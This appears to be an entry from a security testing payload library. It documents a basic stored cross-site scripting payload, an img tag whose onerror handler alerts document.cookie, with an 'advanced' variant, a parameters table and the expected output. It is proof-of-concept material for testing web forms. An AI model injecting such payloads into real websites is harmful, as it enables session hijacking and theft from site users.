---
id: 03b7abb7-0236-4927-8bd5-d5dd64257c08
name: basic-xss-alert
type: command
executor: html
data: <img src=x onerror=alert(document.cookie)>
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:50.157Z'
platforms:
  - Web
tags:
  - xss
  - test-payload
verified: false
validated: true
submitted: true
---

# basic-xss-alert

## Command

```html
<img src=x onerror=alert(document.cookie)>
```

## Description

Basic XSS payload injected into form fields to test stored execution by alerting document cookies when the invalid image src triggers onerror.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Invalid URL (x) to force error | Yes |
| onerror | JavaScript code to execute on error | Yes |

## Examples

### Basic Usage

```html
<img src=x onerror=alert(document.cookie)>
```

### Advanced Usage

```html
<img src=x onerror=alert('XSS Triggered: ' + document.cookie)>
```

## Expected Output

Alert box displaying the current document's cookies, confirming XSS execution.

## Related

- [[commands/xss-cookie-redirect]]
